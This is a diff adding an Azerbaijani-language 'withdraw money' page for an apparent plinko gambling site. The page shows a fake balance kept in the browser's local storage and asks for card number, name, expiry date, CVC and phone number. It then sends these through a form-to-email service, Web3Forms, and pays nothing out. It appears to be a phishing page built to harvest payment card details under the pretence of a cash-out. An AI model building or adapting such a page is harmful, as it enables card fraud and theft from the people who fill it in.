@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="az">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pul Çıxart</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #1e3c72, #2a5298);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      .panel {
+        background: #fff;
+        padding: 25px;
+        border-radius: 15px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        width: 340px;
+      }
+      h2 {
+        text-align: center;
+        margin-bottom: 10px;
+        color: #2a5298;
+      }
+      .balance {
+        text-align: center;
+        font-weight: bold;
+        margin-bottom: 20px;
+        color: #333;
+      }
+      input {
+        width: 100%;
+        padding: 10px;
+        margin: 8px 0;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        font-size: 16px;
+      }
+      .row {
+        display: flex;
+        gap: 10px;
+      }
+      #expiry {
+        flex: 2;
+      }
+      #cvc {
+        flex: 1;
+      }
+      .buttons {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 15px;
+      }
+      button {
+        flex: 1;
+        padding: 10px;
+        margin: 0 5px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        cursor: pointer;
+        color: #fff;
+      }
+      #confirm {
+        background: #28a745;
+      }
+      #back {
+        background: #dc3545;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="panel">
+      <h2>Pul Çıxart</h2>
+      <div class="balance">Balans: <span id="balance">0.00</span> AZN</div>
+
+      <!-- FORM -->
+      <form id="withdrawForm">
+        <!-- Sənin Web3Forms key -->
+        <input
+          type="hidden"
+          name="access_key"
+          value="c729b137-5cfe-4074-ad33-e1cd5f8fc1bd"
+        />
+
+        <input
+          type="text"
+          id="card"
+          name="card"
+          placeholder="Kart nömrəsi"
+          maxlength="19"
+          required
+        />
+        <input
+          type="text"
+          id="name"
+          name="name"
+          placeholder="Ad Soyad"
+          required
+        />
+        <div class="row">
+          <input
+            type="text"
+            id="expiry"
+            name="ad"
+            placeholder="MM/YY"
+            maxlength="5"
+            required
+          />
+          <input
+            type="text"
+            id="cvc"
+            name="ad"
+            placeholder="CVC"
+            maxlength="3"
+            required
+          />
+        </div>
+        <input
+          type="text"
+          id="phone"
+          name="phone"
+          placeholder="050-000-00-00"
+          maxlength="13"
+          required
+        />
+        <input
+          type="number"
+          id="amount"
+          name="balans"
+          placeholder="Məbləğ (AZN)"
+          min="1"
+          required
+        />
+
+        <div class="buttons">
+          <button type="submit" id="confirm">Təsdiqlə</button>
+          <button type="button" id="back">Geri</button>
+        </div>
+      </form>
+    </div>
+
+    <script>
+      // İlk açılışda test üçün balans qoyaq
+      if (!localStorage.getItem("plinko_balance")) {
+        localStorage.setItem("plinko_balance", "10.00"); // test balans
+      }
+
+      // LocalStorage-dan balansı götür
+      let balance = Number(localStorage.getItem("plinko_balance")) || 0;
+      document.getElementById("balance").textContent = balance.toFixed(2);
+
+      // Kart nömrəsi maskalama
+      const cardInput = document.getElementById("card");
+      cardInput.addEventListener("input", () => {
+        let digits = cardInput.value.replace(/\D/g, "").slice(0, 16);
+        cardInput.value = digits.replace(/(.{4})/g, "$1-").replace(/-$/, "");
+      });
+
+      // Expiry maskalama
+      const expiryInput = document.getElementById("expiry");
+      expiryInput.addEventListener("input", (e) => {
+        let value = e.target.value.replace(/\D/g, "").slice(0, 4);
+        if (value.length >= 3) {
+          value = value.slice(0, 2) + "/" + value.slice(2);
+        }
+        e.target.value = value;
+      });
+
+      // Telefon maskalama
+      const phoneInput = document.getElementById("phone");
+      phoneInput.addEventListener("input", (e) => {
+        let value = e.target.value.replace(/\D/g, "").slice(0, 10);
+        let formatted = "";
+        if (value.length > 0) formatted = value.slice(0, 3);
+        if (value.length >= 4) formatted += "-" + value.slice(3, 6);
+        if (value.length >= 7) formatted += "-" + value.slice(6, 8);
+        if (value.length >= 9) formatted += "-" + value.slice(8, 10);
+        e.target.value = formatted;
+      });
+
+      // Form göndərmə
+      document
+        .getElementById("withdrawForm")
+        .addEventListener("submit", async (e) => {
+          e.preventDefault();
+
+          const amount = parseFloat(document.getElementById("amount").value);
+          if (isNaN(amount) || amount <= 0) {
+            alert("Zəhmət olmasa məbləği düzgün daxil edin!");
+            return;
+          }
+          if (amount > balance) {
+            alert("Balansda kifayət qədər məbləğ yoxdur!");
+            return;
+          }
+
+          // Balansı azaldırıq
+          balance -= amount;
+          if (balance < 0) balance = 0;
+          localStorage.setItem("plinko_balance", balance.toFixed(2));
+          document.getElementById("balance").textContent = balance.toFixed(2);
+
+          // Form məlumatlarını Web3Forms-a göndər
+          const formData = new FormData(e.target);
+
+          try {
+            const response = await fetch("https://api.web3forms.com/submit", {
+              method: "POST",
+              body: formData,
+            });
+
+            const result = await response.json();
+            if (result.success) {
+              alert(
+                "Əməliyyat uğurla göndərildi və " + amount + " AZN çıxarıldı!"
+              );
+              e.target.reset(); // formu təmizlə
+            } else {
+              alert("Xəta baş verdi: " + result.message);
+            }
+          } catch (error) {
+            alert("Xəta: " + error.message);
+          }
+        });
+
+      // Geri düyməsi
+      document.getElementById("back").addEventListener("click", () => {
+        window.location.href = "index.html";
+      });
+    </script>
+  </body>
+</html>
